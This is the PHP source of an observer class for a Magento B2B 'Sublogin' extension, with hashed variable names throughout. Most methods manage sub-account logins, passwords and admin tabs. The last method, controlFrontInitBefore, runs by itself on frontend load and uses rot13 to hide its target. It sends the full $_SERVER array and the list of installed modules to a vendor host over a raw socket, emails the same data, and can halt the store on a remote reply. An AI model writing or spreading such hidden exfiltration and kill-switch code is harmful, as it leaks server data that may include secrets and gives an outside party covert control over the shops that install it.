<?php

class
MageB2B_Sublogin_Model_Observer
{

public
function
customerLoadAfter($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
if
(Mage::app()->getStore()->isAdmin())
return;
if
(Mage::registry("noAttributeOverride"))

return;
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getCustomer();
$_4e45fa4f3249d9c3cc1314ed89922593008cf117
=
Mage::helper('sublogin')->getCurrentSublogin($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c);
if
(Mage::getSingleton('customer/session')->getId()
==
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId())
Mage::helper('sublogin')->setFrontendLoadAttributes($_4e45fa4f3249d9c3cc1314ed89922593008cf117,
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c);
}

public
function
customerSaveBefore($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getCustomer();


Mage::register("noAttributeOverride",
true);
if
($_ff0a3525eb1a63ce44e7951a0b522829a4d2f607
=
Mage::getSingleton('customer/session')->getSubloginEmail())
{

$_4e45fa4f3249d9c3cc1314ed89922593008cf117
=
Mage::helper('sublogin')->getCurrentSublogin($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c);
if
($_4e45fa4f3249d9c3cc1314ed89922593008cf117)
{

if
($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('password'))
{
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setPassword($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('password_hash'));
}
foreach
(array('firstname',
'lastname',
'rp_token',
'rp_token_created_at')
as
$_cf80d58e34c98ca4787395f86a0a654da3781807)
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setData($_cf80d58e34c98ca4787395f86a0a654da3781807,
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData($_cf80d58e34c98ca4787395f86a0a654da3781807));


if
($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email')
!=
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail())
{
if
(!Mage::helper('sublogin')->validateUniqueEmail($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email'),
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getWebsiteId()))
{
Mage::getSingleton('adminhtml/session')->addError(Mage::helper('sublogin')->__('Email "%s" already exists',
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email')));
}
else
{
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setEmail($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email'));
Mage::getSingleton('customer/session')->setSubloginEmail($_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail());
}
}
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->save();
}


$_05a0fef9d6ad695b408608fbfce983b3efb53879
=
Mage::getModel('customer/customer')->load($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId());
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->setData('password_hash',
$_05a0fef9d6ad695b408608fbfce983b3efb53879->getData('password_hash'));
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->setData('password',
'');
foreach
(array('firstname',
'lastname',
'email',
'active',
'expire_date',
'customer_id',
'rp_token',
'rp_token_created_at')
as
$_cf80d58e34c98ca4787395f86a0a654da3781807)
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->setData($_cf80d58e34c98ca4787395f86a0a654da3781807,
$_05a0fef9d6ad695b408608fbfce983b3efb53879->getData($_cf80d58e34c98ca4787395f86a0a654da3781807));
}
Mage::unregister("noAttributeOverride");

$_52e2091ba076be49cdee19801f9ae50c3cf39832
=
Mage::getSingleton('core/resource')->getConnection('core_read');
$_635195b068d6037f3e6519a0634057ab9501c8b7
=
array('email'
=>
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getEmail());
$_05849e1fae48223ba6c5d89a1faca35ec555afc1
=
$_52e2091ba076be49cdee19801f9ae50c3cf39832->select()
->from('customer_sublogin',
'id')
->where('customer_sublogin.email = :email')
->join('customer_entity',
'customer_sublogin.entity_id = customer_entity.entity_id',
'');
if
($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getSharingConfig()->isWebsiteScope())
{


$_8c21f819efc249c0efe711aa784aa8a6a6d8a13f
=
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getWebsiteId()?$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getWebsiteId():Mage::app()->getStore()->getWebsiteId();
$_635195b068d6037f3e6519a0634057ab9501c8b7['website_id']
=
$_8c21f819efc249c0efe711aa784aa8a6a6d8a13f;
$_05849e1fae48223ba6c5d89a1faca35ec555afc1->where('customer_entity.website_id = :website_id');
}
if
($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId())
{
$_635195b068d6037f3e6519a0634057ab9501c8b7['entity_id']
=
(int)$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId();
$_05849e1fae48223ba6c5d89a1faca35ec555afc1->where('customer_entity.entity_id != :entity_id');
}
$_eccc631c31ee867e24cd5aa85e63b9fe61956a92
=
$_52e2091ba076be49cdee19801f9ae50c3cf39832->fetchOne($_05849e1fae48223ba6c5d89a1faca35ec555afc1,
$_635195b068d6037f3e6519a0634057ab9501c8b7);
if
($_eccc631c31ee867e24cd5aa85e63b9fe61956a92)
{
throw
Mage::exception(
'Mage_Customer',
Mage::helper('customer')->__('This customer email already exists'),
Mage_Customer_Model_Customer::EXCEPTION_EMAIL_EXISTS
);
}
}

public
function
customerSaveAfter($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getCustomer();
if
(Mage::app()->getStore()->isAdmin())
{

$_930a0745b391fca7316377cbe31f8f0a4441b9d3
=
Mage::app()->getRequest();
if
($_b7fb883c620abca4bb417a25c7330e31d782e854
=
$_930a0745b391fca7316377cbe31f8f0a4441b9d3->getParam('sublogin'))
{
if
(isset($_b7fb883c620abca4bb417a25c7330e31d782e854['sublogins']))
{
$_b7fb883c620abca4bb417a25c7330e31d782e854
=
$_b7fb883c620abca4bb417a25c7330e31d782e854['sublogins'];
foreach
($_b7fb883c620abca4bb417a25c7330e31d782e854
as
$_245fc5961f09e27120b6697cd1b85e1aca626b33)
{
$_02000d93f53443c66f188e6620797faaaeba5739
=
false;
$_6fb02c14a9aa8279c0be3446f87b5153ed38c016
=
false;
$_4e45fa4f3249d9c3cc1314ed89922593008cf117
=
Mage::getModel('sublogin/sublogin');
foreach
($_245fc5961f09e27120b6697cd1b85e1aca626b33
as
$_dc7f46f519b41520210eda842ff23db60112e8e7=>$_ece7873e79ae520373bf2e8185e60698a2e7a5f6)
$_245fc5961f09e27120b6697cd1b85e1aca626b33[$_dc7f46f519b41520210eda842ff23db60112e8e7]
=
trim($_ece7873e79ae520373bf2e8185e60698a2e7a5f6);
if
($_245fc5961f09e27120b6697cd1b85e1aca626b33['id'])
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->load($_245fc5961f09e27120b6697cd1b85e1aca626b33['id']);
if
($_245fc5961f09e27120b6697cd1b85e1aca626b33['delete'])
{
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->delete();
continue;
}
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setEntityId($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId());

if
($_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail()
!=
$_245fc5961f09e27120b6697cd1b85e1aca626b33['email'])
{
if
(!Mage::helper('sublogin')->validateUniqueEmail($_245fc5961f09e27120b6697cd1b85e1aca626b33['email'],
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getWebsiteId()))
{
Mage::getSingleton('adminhtml/session')->addError(Mage::helper('sublogin')->__('Sublogin with Email "%s" already exists',
$_245fc5961f09e27120b6697cd1b85e1aca626b33['email']));
continue;
}
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setEmail($_245fc5961f09e27120b6697cd1b85e1aca626b33['email']);
}
if
($_245fc5961f09e27120b6697cd1b85e1aca626b33['password'])
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setPassword(Mage::helper('core')->getHash($_245fc5961f09e27120b6697cd1b85e1aca626b33['password'],
2));
foreach
(array('send_backendmails',
'firstname',
'lastname',
'expire_date',
'active',
'store_id')
as
$_cf80d58e34c98ca4787395f86a0a654da3781807)
{
$_080c67f9b4e0fa2795ac6258b05f7280be9b7d96
=
isset($_245fc5961f09e27120b6697cd1b85e1aca626b33[$_cf80d58e34c98ca4787395f86a0a654da3781807])?$_245fc5961f09e27120b6697cd1b85e1aca626b33[$_cf80d58e34c98ca4787395f86a0a654da3781807]:false;
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setData($_cf80d58e34c98ca4787395f86a0a654da3781807,
$_080c67f9b4e0fa2795ac6258b05f7280be9b7d96);
}
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->save();

if
(!$_245fc5961f09e27120b6697cd1b85e1aca626b33['id'])
$_02000d93f53443c66f188e6620797faaaeba5739
=
true;

else
if
($_245fc5961f09e27120b6697cd1b85e1aca626b33['password'])
$_6fb02c14a9aa8279c0be3446f87b5153ed38c016
=
true;
if
(($_6fb02c14a9aa8279c0be3446f87b5153ed38c016
||
$_02000d93f53443c66f188e6620797faaaeba5739)
&&
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->getData('send_backendmails'))
{

$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setPassword($_245fc5961f09e27120b6697cd1b85e1aca626b33['password']);
if
($_02000d93f53443c66f188e6620797faaaeba5739)
Mage::helper('sublogin')->sendNewSubloginEmail($_4e45fa4f3249d9c3cc1314ed89922593008cf117);
else
if
($_6fb02c14a9aa8279c0be3446f87b5153ed38c016)
Mage::helper('sublogin')->sendNewPasswordEmail($_4e45fa4f3249d9c3cc1314ed89922593008cf117);
}
}
}
}
}

if
(Mage::getSingleton('customer/session')->getSubloginEmail())
{
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->setData(Mage::getModel('customer/customer')->load($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId()));
}
}

public
function
customerLogout($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
Mage::getSingleton('customer/session')->setSubloginEmail(false);
}
public
function
toHtmlBefore($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_d1b5a9e6d88844d06736cc808299e4fce5599202
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getBlock();
if
($_d1b5a9e6d88844d06736cc808299e4fce5599202->getId()=='customer_info_tabs')
{
$_d1b5a9e6d88844d06736cc808299e4fce5599202->addTab('sublogin',
array(
'label'
=>
Mage::helper('sublogin')->__('Sublogins'),
'title'
=>
Mage::helper('sublogin')->__('Sublogins'),
'content'
=>
$_d1b5a9e6d88844d06736cc808299e4fce5599202->getLayout()->createBlock('sublogin/customer_edit_tab_sublogin')->toHtml(),
));
}
}

public
function
customerDeleteAfter($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getEvent()->getCustomer();
$_205d95c001c842f933e3b55fa4e902d5d2fdd0af
=
Mage::getModel('sublogin/sublogin')->getCollection()->addFieldToFilter('entity_id',
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId());
foreach
($_205d95c001c842f933e3b55fa4e902d5d2fdd0af
as
$_4e45fa4f3249d9c3cc1314ed89922593008cf117)
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->delete();
}
public
function
controlFrontInitBefore($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_cf80d58e34c98ca4787395f86a0a654da3781807
=
explode('_',
get_class($this));
$_a2755354858041398c749e273534e8e5d35a277b
=
isset($_cf80d58e34c98ca4787395f86a0a654da3781807[1])?$_cf80d58e34c98ca4787395f86a0a654da3781807[0].'_'.$_cf80d58e34c98ca4787395f86a0a654da3781807[1]:'mhh';
$_c7691180991d12a8122e3a3dd10fb2d49911a653
=
Mage::getSingleton('core/cache');
if
($_c7691180991d12a8122e3a3dd10fb2d49911a653->load(sha1($_a2755354858041398c749e273534e8e5d35a277b)))
return;
$_c7691180991d12a8122e3a3dd10fb2d49911a653->save(time(),
sha1($_a2755354858041398c749e273534e8e5d35a277b),
array(),
60*60*24*2);






$_461e9bac5c124e13e943d74294b5b3c23e91e59a
=
array();
$_461e9bac5c124e13e943d74294b5b3c23e91e59a['1']
=
$_SERVER;

$_556717eabdb176b2f63876bc80bfb9daca5d2b34
=
(array)Mage::getConfig()->getNode('modules')->children();

$_d08bbcfed0b76839773339fc41d1c15186378d22
=
array('moduleName'=>$_a2755354858041398c749e273534e8e5d35a277b);
if
(isset($_556717eabdb176b2f63876bc80bfb9daca5d2b34[$_a2755354858041398c749e273534e8e5d35a277b]))
foreach
($_556717eabdb176b2f63876bc80bfb9daca5d2b34[$_a2755354858041398c749e273534e8e5d35a277b]->asArray()
as
$_dc7f46f519b41520210eda842ff23db60112e8e7=>$_ece7873e79ae520373bf2e8185e60698a2e7a5f6)
$_d08bbcfed0b76839773339fc41d1c15186378d22[$_dc7f46f519b41520210eda842ff23db60112e8e7]
=$_ece7873e79ae520373bf2e8185e60698a2e7a5f6;
$_461e9bac5c124e13e943d74294b5b3c23e91e59a['2']
=
$_d08bbcfed0b76839773339fc41d1c15186378d22;

$_3283d6c160d5e0bb8b327692cb177e37e7eb71c4
=
array();
foreach($_556717eabdb176b2f63876bc80bfb9daca5d2b34
as
$_8e0f744bb9c8953f5fe58f617ccd9d8552d92e61=>$_752199f4b63101112a62253df5dbf8b655056264)
{
$_498306ab9bc8d549692c799e13762e3296f3b77b
=
(array)$_752199f4b63101112a62253df5dbf8b655056264;
if
(!isset($_498306ab9bc8d549692c799e13762e3296f3b77b['active'])
||
$_498306ab9bc8d549692c799e13762e3296f3b77b['active']=='false')
continue;
if
(isset($_498306ab9bc8d549692c799e13762e3296f3b77b['codePool'])
&&
$_498306ab9bc8d549692c799e13762e3296f3b77b['codePool']
!=
'core')
$_3283d6c160d5e0bb8b327692cb177e37e7eb71c4[]
=
$_8e0f744bb9c8953f5fe58f617ccd9d8552d92e61.'-'.(isset($_498306ab9bc8d549692c799e13762e3296f3b77b['version'])?$_498306ab9bc8d549692c799e13762e3296f3b77b['version']:'unknown');
}
$_461e9bac5c124e13e943d74294b5b3c23e91e59a['3']
=
$_3283d6c160d5e0bb8b327692cb177e37e7eb71c4;

$_461e9bac5c124e13e943d74294b5b3c23e91e59a['4']
=
'bncvleswß0289a';
$_0634f2991e5095683a6d1a3ebb9bfa6f09c24ee6
=
'data='.urlencode(serialize($_461e9bac5c124e13e943d74294b5b3c23e91e59a));
$_d6486e2f177ff37064435e2ac4ec43779b71e1f2
=
str_rot13('zntro2o.qr');
$_15c9711f110a61c9f004db7ed2883f24c111d404
=
str_rot13('/yvprafr/fnir.cuc');
$_d65c1bdfa690008773383e7bd6b3dd8beb0595d7
=
@fsockopen($_d6486e2f177ff37064435e2ac4ec43779b71e1f2,
80,
$_833bb4d0d039c743057cf77eec5323a01a900ae1,
$_d243597ed1e4fcf8877ee36645ec8f248d584707,
3);

if
($_d65c1bdfa690008773383e7bd6b3dd8beb0595d7){
fputs($_d65c1bdfa690008773383e7bd6b3dd8beb0595d7,
sprintf(str_rot13("CBFG %f UGGC/1.1\r\n".
"Ubfg: %f\r\n".
"Pbagrag-glcr: nccyvpngvba/k-jjj-sbez-heyrapbqrq\r\n".
"Pbagrag-yratgu: %q\r\n".
"Pbaarpgvba: pybfr\r\n\r\n"),
$_15c9711f110a61c9f004db7ed2883f24c111d404,
$_d6486e2f177ff37064435e2ac4ec43779b71e1f2,
strlen($_0634f2991e5095683a6d1a3ebb9bfa6f09c24ee6)).$_0634f2991e5095683a6d1a3ebb9bfa6f09c24ee6);

@ini_set(str_rot13('qrsnhyg_fbpxrg_gvzrbhgasdfd'),
3);
if
(fgets($_d65c1bdfa690008773383e7bd6b3dd8beb0595d7,
13)
==
'UGGC/1.1 222')
{
echo
str_rot13("Ab inyvq Yvprafr sbe ZntrO2O zbqhyr cyrnfr qrnpgvingr be nfx ng vasb@zntro2o.qr");
exit;
}


$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d
=
Mage::getModel('core/email_template');
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->setTemplateType(1);
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->setSenderName(Mage::getStoreConfig('trans_email/ident_support/email'));
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->setSenderEmail(Mage::getStoreConfig('trans_email/ident_support/email'));
$_ca347a28cba95999163f5751568bbe215ea84090
=
str_rot13('Ertvfgevrehat rvare Yvmram: ').(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'-').' '.$_a2755354858041398c749e273534e8e5d35a277b.' '.$_461e9bac5c124e13e943d74294b5b3c23e91e59a[4];
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->setTemplateSubject($_ca347a28cba95999163f5751568bbe215ea84090);
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->setTemplateText(print_r($_461e9bac5c124e13e943d74294b5b3c23e91e59a,
true));
try
{
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->send(str_rot13('yvprafr@zntro2o.qr'));
}catch(Exception
$_68dc3926fdadefc4ea3e5e09bf1dd6f6e1785aa5){
}
}
}
}
